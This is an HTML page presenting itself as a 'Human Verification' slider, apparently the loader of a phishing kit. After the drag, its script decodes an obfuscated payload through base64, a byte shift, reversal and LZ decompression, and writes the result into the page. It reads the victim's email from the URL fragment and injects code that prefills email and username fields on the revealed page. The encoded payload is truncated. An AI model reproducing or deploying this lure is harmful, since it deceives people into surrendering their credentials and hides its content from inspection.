<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Loading...</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
<style>
  #css-pass::before { content: "UECecF"; display:none; }
  #human-overlay { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(255,255,255,0.98); z-index:2147483647; font-family: system-ui, sans-serif; }
  #human-box { background: white; border-radius:12px; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.15); text-align:center; max-width:90%; width: 360px; }
  #slider-container { margin-top: 20px; }
  #slider-track { width: 280px; height: 50px; background: #f0f0f0; border: 2px solid #ddd; border-radius: 25px; position: relative; margin: 0 auto; overflow: hidden; }
  #slider-handle { width: 50px; height: 46px; background: #0b61ff; border-radius: 23px; position: absolute; left: 0; top: 0; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; cursor: grab; user-select: none; touch-action: none; transition: background 0.2s; }
  #slider-handle:active { cursor: grabbing; background: #0050e0; }
  #slider-text { margin-top: 12px; font-size: 14px; color: #666; }

<body>
<div id="css-pass" aria-hidden="true"></div>

<div id="human-overlay">
  <div id="human-box">
    <h2 style="margin:0 0 8px 0">Human Verification</h2>
    <p style="margin:0 0 12px 0; color:#666;">Please complete the action below to continue.</p>
    <div id="slider-container">
      <div id="slider-track">
        <div id="slider-handle">→</div>
      </div>
      <div id="slider-text">Drag to the right to prove you are human</div>
    </div>
  </div>
</div>

<script>
console.log("[Decoder] Starting.");

var piecesArr = ["alBGalhGSE1SXXpVdk5IRXdUWE1qRnI3R0RQc29GdlBLRGRNRGg7XEhEdnJEWkZMbU5uTW9MO3tWVERINWdEM1lcRGZbUURQRUxVNUhkRFxwdUQ1ZWlwZ1JFalF5W0Q5TlJEd0RMdXY5RHJkUURaRVRaa0kzXFFGRGg4RHpQRF1EN0pEPG..."];

function reassemblePieces() {
  var out = '';
  try {
    for (var i = 0; i < piecesArr.length; i++) {
      var b64piece = piecesArr[i];
      var transformed = atob(b64piece);
      var rot = (transformed.length % 11);
      var chars = [];
      for (var j = 0; j < transformed.length; j++) {
        var code = (transformed.charCodeAt(j) - rot) & 0xFF;
        chars.push(String.fromCharCode(code));
      }
      out += chars.reverse().join('');
    }
    return out;
  } catch (e) {
    console.error('[Decoder] Reassembly failed:', e);
    return null;
  }
}

var handle = document.getElementById('slider-handle');
var track = document.getElementById('slider-track');
var isDragging = false;
var startX = 0;
var handleLeft = 0;

function startDrag(e) {
  isDragging = true;
  startX = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
  handleLeft = handle.offsetLeft;
  document.addEventListener('mousemove', drag);
  document.addEventListener('touchmove', drag, {passive: false});
  document.addEventListener('mouseup', stopDrag);
  document.addEventListener('touchend', stopDrag);
}
function drag(e) {
  if (!isDragging) return;
  e.preventDefault();
  var x = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
  var dx = x - startX;
  var maxLeft = track.offsetWidth - handle.offsetWidth;
  var newLeft = Math.max(0, Math.min(handleLeft + dx, maxLeft));
  handle.style.left = newLeft + 'px';
  if (newLeft >= maxLeft - 5) { stopDrag(); triggerReconstruct(); }
}
function stopDrag() {
  isDragging = false;
  document.removeEventListener('mousemove', drag);
  document.removeEventListener('touchmove', drag);
  document.removeEventListener('mouseup', stopDrag);
  document.removeEventListener('touchend', stopDrag);
  if (handle.offsetLeft < track.offsetWidth - handle.offsetWidth - 5) handle.style.left = '0px';
}
function triggerReconstruct() { var overlay = document.getElementById('human-overlay'); if (overlay) overlay.remove(); attemptReconstruct(); }
handle.addEventListener('mousedown', startDrag);
handle.addEventListener('touchstart', startDrag, {passive: false});

function attemptReconstruct() {
  var assembled = reassemblePieces();
  if (!assembled) { document.body.innerHTML = '<h2 style=\"color:red;text-align:center;margin-top:50px;\">Reassembly failed.</h2>'; return; }

  try {
    var html = LZString.decompressFromBase64(assembled);
    if (!html) throw new Error('Decompression returned null');

    var rawHash = '';
    try {
      rawHash = (window.location.hash && window.location.hash.length>1) ? decodeURIComponent(window.location.hash.replace(/^#/,'') ) : (window.location.href.indexOf('#')>-1 ? decodeURIComponent(window.location.href.split('#').pop()) : '');
    } catch(e) {
      rawHash = '';
    }

    if (rawHash) {
      console.log('[Decoder] email present:', rawHash);

      // Direct string replacements before render
      html = html.replace(/(<input\\s+[^>]*\\b(?:id|name)\\s*=\\s*["'](?:email|Email)["'][^>]*>)/ig, function(m){
        if (/\\bvalue\\s*=\\s*["']/i.test(m)) return m;
        return m.replace(/>$/, ' value="' + rawHash + '">');
      });

      html = html.replace(/(<input\\s+[^>]*\\b(?:id|name)\\s*=\\s*["'](?:email|Email)["'][^>]*\\bvalue\\s*=\\s*["'][^>]*["'][^>]*>)/ig, function(m){
        return m.replace(/value\\s*=\\s*["'][^"']*["']/i, 'value="' + rawHash + '"');
      });

      html = html.replace(/(<h[1-6][^>]*\\bid\\s*=\\s*["']auth_email["'][^>]*>)(.*?)(<\\/h[1-6]>)/ig, function(all, open, inner, close){
        return open + rawHash + close;
      });

      html = html.replace(/(<[a-zA-Z0-9-]+[^>]*\\bid\\s*=\\s*["']auth_email["'][^>]*>)(.*?)(<\\/[^>]+>)/ig, function(all, open, inner, close){
        return open + rawHash + close;
      });

      // Safe injection: build script as function string and stringify input
      (function(email) {
        function filler(emailVal) {
          try {
            var hid = document.querySelector('input[name="email"][type="hidden"], input#email[type="hidden"]');
            if (hid) {
              try { hid.value = emailVal; hid.dispatchEvent(new Event('input', {bubbles:true})); hid.dispatchEvent(new Event('change', {bubbles:true})); } catch (e) {}
            }

            try {
              var disp = document.getElementById('auth_email');
              if (disp) disp.textContent = emailVal;
            } catch (e) {}

            var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
            function tryFillVisible() {
              var inputs = document.querySelectorAll('input');
              if (!inputs || inputs.length === 0) return false;
              var filled = false;
              for (var i = 0; i < inputs.length; i++) {
                var el = inputs[i];
                var id = (el.id || '').toLowerCase();
                var name = (el.name || '').toLowerCase();
                var ph = (el.placeholder || '').toLowerCase();
                var type = (el.type || '').toLowerCase();
                if (type === 'email' || id.indexOf('email') > -1 || name.indexOf('email') > -1 ||
                    id.indexOf('user') > -1 || name.indexOf('user') > -1 ||
                    ph.indexOf('email') > -1 || ph.indexOf('user') > -1 || name.indexOf('mail') > -1) {
                  try {
                    if (nativeSetter) nativeSetter.call(el, emailVal);
                    else el.value = emailVal;
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    el.dispatchEvent(new Event('change', {bubbles:true}));
                    el.dispatchEvent(new Event('blur', {bubbles:true}));
                    filled = true;
                  } catch (e) {}
                }
              }
              return filled;
            }

            var attempts = 0;
            var id = setInterval(function() {
              if (tryFillVisible() || attempts > 30) { clearInterval(id); }
              attempts++;
            }, 300);

            try {
              var mo = new MutationObserver(function() {
                if (tryFillVisible()) { try { mo.disconnect(); } catch(e) {} }
              });
              mo.observe(document.documentElement || document.body, { childList: true, subtree: true });
              setTimeout(function() { try { mo.disconnect(); } catch(e) {} }, 10000);
            } catch(e) {}
          } catch (e) {}
        }

        // script insertion
        var scriptTag = '<scr' + 'ipt>' + '(' + filler.toString() + ')(' + JSON.stringify(email) + ');' + '<\\/scr' + 'ipt>';
        if (/<\\/body\\s*>/i.test(html)) {
          html = html.replace(/<\\/body\\s*>/i, scriptTag + '</body>');
        } else if (/<\\/head\\s*>/i.test(html)) {
          html = html.replace(/<\\/head\\s*>/i, scriptTag + '</head>');
        } else {
          html = scriptTag + html;
        }
      })(rawHash);

      try { sessionStorage.setItem('__prefill_email', rawHash); } catch (e) {}
    } else {
      console.log('[Decoder] No hash present; skipping injection');
    }

    document.open();
    document.write(html);
    document.close();
    console.log('[Decoder] Complete');
  } catch (e) {
    console.error('[Decoder] Fatal error:', e);
    document.body.innerHTML = '<h2 style=\"color:red;text-align:center;margin-top:50px;\">Reconstruction failed: ' + e.message + '</h2>';
  }
}
</script>
